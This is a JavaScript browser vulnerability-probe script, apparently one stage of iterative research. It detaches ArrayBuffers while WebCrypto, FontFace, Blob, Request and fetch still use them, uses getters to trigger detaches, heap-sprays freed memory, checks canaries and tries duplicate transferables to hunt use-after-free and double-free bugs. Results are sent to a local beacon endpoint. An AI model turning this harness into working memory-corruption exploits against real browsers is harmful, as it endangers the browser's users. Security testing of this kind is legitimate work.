/* p121-rab-handoff — the *real* TOCTOU class: async consumers of BufferSource.
 *
 * Premise (from p118 T1/T2): structuredClone does NOT defer the copy. It is
 * falsified by your own data. So stop looking at structuredClone and look at
 * APIs that hand a JS buffer to native code that runs LATER (queue / thread /
 * task) while JS still owns the buffer.
 *
 * Every test follows the same shape:
 *     hand(view) -> detach(backing) -> let native code run -> observe
 *
 * Also covers duplicate transferables (canonical double-free shape), which
 * your report does not mention testing.
 *
 * Beacon prefix: P121H-
 */
(function () {
"use strict";

var PREFIX = "P121H";
var RUN = "p121h" + Math.random().toString(36).slice(2, 12);

function post(tag, body) {
  var s = typeof body === "string" ? body : JSON.stringify(body);
  try {
    fetch("/beacon/" + PREFIX + "-" + tag, {
      method: "POST",
      body: JSON.stringify({ r: RUN, b: s }),
      headers: { "Content-Type": "application/json" },
      keepalive: true
    })["catch"](function () {});
  } catch (e) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/beacon/" + PREFIX + "-" + tag, false);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ r: RUN, b: s }));
    } catch (e2) {}
  }
}
function mark(n) { post("M", n); }
function en(e) { return e && (e.name + ":" + String(e.message).slice(0, 90)); }

/* Portable detach: frees the backing store, unlike resize(0) which is in-place. */
function detach(ab) {
  try { if (typeof ab.transfer === "function") { ab.transfer(); return "transfer()"; } } catch (e) {}
  try { structuredClone(ab, { transfer: [ab] }); return "structuredClone"; } catch (e) {}
  try {
    var ch = new MessageChannel();
    ch.port1.postMessage(null, [ab]);
    ch.port1.close(); ch.port2.close();
    return "postMessage";
  } catch (e) {}
  return "FAILED";
}

var CAN = new Uint32Array(512);
for (var ci = 0; ci < CAN.length; ci++) CAN[ci] = (0xCA000000 + ci) >>> 0;
function canaryOK() {
  for (var i = 0; i < CAN.length; i++) if (CAN[i] !== ((0xCA000000 + i) >>> 0)) return false;
  return true;
}

/* Allocation churn so that a freed backing store is likely to be reused. */
function spray(n, size) {
  var keep = [];
  for (var i = 0; i < n; i++) {
    var b = new ArrayBuffer(size);
    var v = new Uint32Array(b);
    for (var j = 0; j < v.length; j++) v[j] = 0x5A5A0000 | (i & 0xFFFF);
    keep.push(b);
  }
  return keep;
}

var TESTS = [], KEEP = [];
function T(name, fn) { TESTS.push([name, fn]); }

/* ---------------------------------------------------------------- */
/* A. WebCrypto: async work on a BufferSource                        */
/* ---------------------------------------------------------------- */

T("A1-subtle-digest-detach", function () {
  if (typeof crypto === "undefined" || !crypto.subtle) return { skip: "no subtle" };
  var rab = new ArrayBuffer(1 << 20, { maxByteLength: 1 << 20 });
  new Uint8Array(rab).fill(0x41);
  var p = crypto.subtle.digest("SHA-256", rab);
  var how = detach(rab);                       // freed while digest "runs"
  KEEP.push(spray(64, 1 << 16));
  return p.then(function (d) {
    return { len: d.byteLength, detach: how, ok: d.byteLength === 32 };
  }, function (e) { return { rej: en(e), detach: how }; });
});

T("A2-subtle-digest-shrink-rab", function () {
  if (typeof crypto === "undefined" || !crypto.subtle) return { skip: "no subtle" };
  var rab = new ArrayBuffer(1 << 20, { maxByteLength: 1 << 20 });
  new Uint8Array(rab).fill(0x42);
  var p = crypto.subtle.digest("SHA-256", new Uint8Array(rab));
  rab.resize(16);                              // in-place, but length changes
  return p.then(function (d) { return { len: d.byteLength }; },
                function (e) { return { rej: en(e) }; });
});

T("A3-subtle-algo-getter-detaches-data", function () {
  if (typeof crypto === "undefined" || !crypto.subtle) return { skip: "no subtle" };
  var rab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(rab); u8.fill(7);
  return crypto.subtle.importKey("raw", new Uint8Array(16), "AES-GCM", false, ["encrypt"])
    .then(function (key) {
      var algo = {
        name: "AES-GCM",
        get iv() { detach(rab); return new Uint8Array(12); }
      };
      // argument coercion order: algorithm (getter fires) -> key -> data
      return crypto.subtle.encrypt(algo, key, u8).then(
        function (ct) { return { CT: ct.byteLength, UAF_SUSPECT: true }; },
        function (e) { return { rej: en(e) }; });
    });
});

/* ---------------------------------------------------------------- */
/* B. FontFace: async font parse on an ArrayBuffer we can detach      */
/* ---------------------------------------------------------------- */

T("B1-fontface-detach", function () {
  if (typeof FontFace !== "function") return { skip: "no FontFace" };
  var ab = new ArrayBuffer(4096);
  var v = new Uint8Array(ab);
  // minimal sfnt-ish header so the loader does not bail at byte 0
  v[0] = 0x00; v[1] = 0x01; v[2] = 0x00; v[3] = 0x00;
  var ff = new FontFace("P121-Test", ab);
  var p = ff.load();
  var how = detach(ab);
  KEEP.push(spray(64, 4096));
  return p.then(
    function (f) { return { loaded: true, detach: how }; },
    function (e) { return { rej: en(e), detach: how }; });
});

/* ---------------------------------------------------------------- */
/* C. Blob / Response / Request bodies                               */
/* ---------------------------------------------------------------- */

T("C1-response-body-detach", function () {
  var ab = new ArrayBuffer(1 << 16);
  new Uint8Array(ab).fill(0x43);
  var r = new Response(new Uint8Array(ab));
  var how = detach(ab);
  return r.arrayBuffer().then(
    function (b) { return { len: b.byteLength, detach: how, ok: b.byteLength === (1 << 16) }; },
    function (e) { return { rej: en(e), detach: how }; });
});

T("C2-blob-detach", function () {
  var ab = new ArrayBuffer(1 << 16);
  new Uint8Array(ab).fill(0x44);
  var b = new Blob([new Uint8Array(ab)]);
  var how = detach(ab);
  return b.arrayBuffer().then(
    function (x) { return { len: x.byteLength, detach: how, ok: x.byteLength === (1 << 16) }; },
    function (e) { return { rej: en(e), detach: how }; });
});

T("C3-request-body-detach", function () {
  var ab = new ArrayBuffer(4096);
  new Uint8Array(ab).fill(0x45);
  var req = new Request("https://x.invalid/", { method: "POST", body: new Uint8Array(ab) });
  var how = detach(ab);
  return req.arrayBuffer().then(
    function (x) { return { len: x.byteLength, detach: how }; },
    function (e) { return { rej: en(e), detach: how }; });
});

T("C4-request-headers-getter-detaches-body", function () {
  var ab = new ArrayBuffer(1 << 16);
  var u8 = new Uint8Array(ab); u8.fill(0x47);
  var req;
  try {
    // WebIDL converts dictionary members lexicographically: body < headers.
    req = new Request("https://x.invalid/", {
      method: "POST",
      body: u8,
      get headers() { detach(ab); return {}; }
    });
  } catch (e) { return { ctorErr: en(e) }; }
  return req.arrayBuffer().then(
    function (x) { return { len: x.byteLength, expect: 1 << 16 }; },
    function (e) { return { rej: en(e) }; });
});

T("C5-fetch-signal-getter-detaches-body", function () {
  if (typeof fetch !== "function") return { skip: "no fetch" };
  var ab = new ArrayBuffer(4096);
  new Uint8Array(ab).fill(0x48);
  var u8 = new Uint8Array(ab);
  return fetch("https://x.invalid/p121", {
    method: "POST",
    body: u8,
    get signal() { detach(ab); return undefined; }   // signal sorts after body
  }).then(function (r) { return { status: r.status }; },
          function (e) { return { rej: en(e) }; });
});

/* ---------------------------------------------------------------- */
/* D. ImageBitmap transfer (resource, not data)                      */
/* ---------------------------------------------------------------- */

T("D1-imagebitmap-transfer-then-draw", function () {
  if (typeof createImageBitmap !== "function" || typeof OffscreenCanvas !== "function") {
    return { skip: "no createImageBitmap/OffscreenCanvas" };
  }
  var c = new OffscreenCanvas(8, 8);
  var g = c.getContext("2d");
  g.fillStyle = "#f00"; g.fillRect(0, 0, 8, 8);
  return createImageBitmap(c).then(function (bm) {
    var moved;
    try { moved = structuredClone(bm, { transfer: [bm] }); }
    catch (e) { return { xferErr: en(e) }; }
    var out = {};
    try { g.drawImage(bm, 0, 0); out.drawDetached = "NO THROW"; }
    catch (e) { out.drawDetached = en(e); }
    try { g.drawImage(moved, 0, 0); out.drawMoved = "ok"; }
    catch (e) { out.drawMoved = en(e); }
    return out;
  });
});

/* ---------------------------------------------------------------- */
/* E. Duplicate transferables — canonical double-free shape          */
/* ---------------------------------------------------------------- */

function expectThrow(label, fn) {
  try { var r = fn(); return { label: label, NO_THROW: true, r: String(r).slice(0, 40) }; }
  catch (e) { return { label: label, threw: e.name }; }
}

T("E1-clone-dup-ab", function () {
  var ab = new ArrayBuffer(64);
  return expectThrow("clone[ab,ab]", function () {
    return structuredClone({ ab: ab }, { transfer: [ab, ab] });
  });
});

T("E2-clone-dup-via-view", function () {
  var ab = new ArrayBuffer(64);
  var u8 = new Uint8Array(ab);
  return expectThrow("clone[ab,u8.buffer]", function () {
    return structuredClone({ ab: ab }, { transfer: [ab, u8.buffer] });
  });
});

T("E3-postmessage-dup-ab", function () {
  var ch = new MessageChannel();
  var ab = new ArrayBuffer(64);
  var r = expectThrow("pm[ab,ab]", function () {
    ch.port1.postMessage({ ab: ab }, [ab, ab]);
  });
  ch.port1.close(); ch.port2.close();
  return r;
});

T("E4-postmessage-dup-port", function () {
  var ch = new MessageChannel();
  var r = expectThrow("pm[port,port]", function () {
    ch.port1.postMessage({ p: ch.port2 }, [ch.port2, ch.port2]);
  });
  ch.port1.close(); ch.port2.close();
  return r;
});

T("E5-postmessage-msg-and-transfer", function () {
  var ch = new MessageChannel();
  var ab = new ArrayBuffer(64);
  var r = expectThrow("pm({a:ab,b:ab},[ab])", function () {
    ch.port1.postMessage({ a: ab, b: ab }, [ab]);
  });
  ch.port1.close(); ch.port2.close();
  return r;
});

T("E6-transfer-inside-getter", function () {
  var ch = new MessageChannel();
  var ab = new ArrayBuffer(64);
  var msg = {
    get x() { ch.port1.postMessage(null, [ab]); return 1; }, // first transfer
    ab: ab
  };
  var r = expectThrow("double-transfer-getter", function () {
    ch.port1.postMessage(msg, [ab]);                        // second transfer
  });
  ch.port1.close(); ch.port2.close();
  return r;
});

T("E7-clone-port-then-use", function () {
  var ch = new MessageChannel();
  var got = [];
  ch.port2.onmessage = function (e) { got.push(e.data); };
  var p2 = ch.port2;
  ch.port1.postMessage(null, [p2]);          // entangle it away
  var r = {};
  try { p2.postMessage("after-transfer"); r.send = "ok"; } catch (e) { r.send = en(e); }
  try { p2.close(); r.close = "ok"; } catch (e) { r.close = en(e); }
  ch.port1.close();
  return r;
});

/* F. history.state holds a serialized copy; detach after the fact */
T("F1-history-detach", function () {
  var ab = new ArrayBuffer(4096);
  new Uint8Array(ab).fill(0x46);
  var st = { ab: ab };
  history.replaceState(st, "");
  var how = detach(ab);
  var s = history.state;
  return {
    detach: how,
    stateLen: s && s.ab ? s.ab.byteLength : -1,
    firstByte: s && s.ab && s.ab.byteLength ? new Uint8Array(s.ab)[0] : -1
  };
});

/* ---------------------------------------------------------------- */
/* runner                                                           */
/* ---------------------------------------------------------------- */
function run() {
  post("L", "p121 start");
  var i = 0;
  function step() {
    if (i >= TESTS.length) { post("Z", "p121 done"); return; }
    var name = TESTS[i][0], fn = TESTS[i][1];
    i++;
    mark(name);
    var t0 = Date.now(), done = false;
    var timer = setTimeout(function () { fin({ TIMEOUT: true }); }, 9000);
    function fin(res) {
      if (done) return;
      done = true;
      clearTimeout(timer);
      res = res || {};
      res.ms = Date.now() - t0;
      res.canary = canaryOK();
      post(name, res);
      setTimeout(step, 150);
    }
    try {
      var r = fn();
      if (r && typeof r.then === "function") {
        r.then(function (v) { fin({ ok: true, v: v }); },
               function (e) { fin({ ok: false, err: en(e) }); });
      } else { fin({ ok: true, v: r }); }
    } catch (e) { fin({ ok: false, err: en(e) }); }
  }
  step();
}

if (typeof document !== "undefined" && document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", run);
} else { run(); }
})();
